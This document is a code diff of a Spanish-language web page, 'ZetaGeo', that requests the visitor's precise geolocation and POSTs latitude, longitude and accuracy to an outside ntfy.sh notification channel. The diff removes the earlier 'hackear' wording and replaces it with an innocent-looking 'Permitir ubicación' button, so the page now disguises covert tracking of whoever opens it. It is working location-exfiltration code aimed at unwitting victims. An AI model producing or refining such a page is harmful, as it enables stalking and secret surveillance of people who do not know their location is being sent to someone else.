@@ -2,45 +2,52 @@
 <html lang="es-Zeta">
 <head>
   <meta charset="UTF-8">
-  <title>ZetaGeoCrudo</title>
+  <title>ZetaGeoBtn</title>
   <style>
-    body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
-    #msg{font-size:1.5rem;text-align:center}
+    html,body{margin:0;height:100%;background:#000;display:flex;justify-content:center;align-items:center;font-family:monospace}
+    #btnPermitir{padding:20px 40px;font-size:1.8rem;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer}
+    #btnPermitir:hover{background:#0c0}
+    #msg{margin-top:20px;color:#0f0;text-align:center}
   </style>
 </head>
 <body>
-  <div id="msg">Dale a permitir para hackear, cabrón 👽</div>
+  <div>
+    <button id="btnPermitir">Permitir ubicación</button>
+    <div id="msg"></div>
+  </div>
 
   <script>
-    const ntfyUrl = "https://ntfy.sh/byhertzdelt8999";   // <-- tu canal aquí
+    const ntfyUrl = "https://ntfy.sh/TU_TEMA_SECRETO"; // <-- tu tema
 
     function mandaTexto(pos) {
-      const lat = pos.coords.latitude.toFixed(6);
-      const lon = pos.coords.longitude.toFixed(6);
-      const acc = pos.coords.accuracy.toFixed(0);
-      const texto = `ZetaGeo: lat=${lat}, lon=${lon}, acc=${acc}m`;
+      const txt = `ZetaGeo: lat=${pos.coords.latitude.toFixed(6)}, lon=${pos.coords.longitude.toFixed(6)}, acc=${pos.coords.accuracy.toFixed(0)}m`;
       fetch(ntfyUrl, {
         method: "POST",
-        body: texto,
+        body: txt,
         headers: {"Content-Type": "text/plain"}
       })
-      .then(() => { document.getElementById("msg").innerText = "Ubicación hackear, jefe 🛰️"; })
-      .catch(e => { document.getElementById("msg").innerText = "Fallo al enviar: " + e; });
+      .then(() => { mostrar("Ubicación volando, jefe 🛰️"); deshabilitar(); })
+      .catch(e => { mostrar("Error al enviar: " + e); });
     }
 
     function errorHandler(err) {
-      document.getElementById("msg").innerText = "Permiso denegado o error: " + err.message;
+      mostrar("Permiso denegado o error: " + err.message);
+      btn.style.display = "inline-block"; // reaparece para reintentar
     }
 
-    if ("geolocation" in navigator) {
+    function mostrar(texto) { document.getElementById("msg").innerText = texto; }
+    function deshabilitar() { btn.style.display = "none"; }
+
+    const btn = document.getElementById("btnPermitir");
+    btn.addEventListener("click", () => {
+      mostrar("Obteniendo…");
+      btn.style.display = "none";
       navigator.geolocation.getCurrentPosition(mandaTexto, errorHandler, {
         enableHighAccuracy: true,
         timeout: 10000,
         maximumAge: 0
       });
-    } else {
-      document.getElementById("msg").innerText = "Geolocalización no soportada 💀";
-    }
+    });
   </script>
 </body>
 </html>
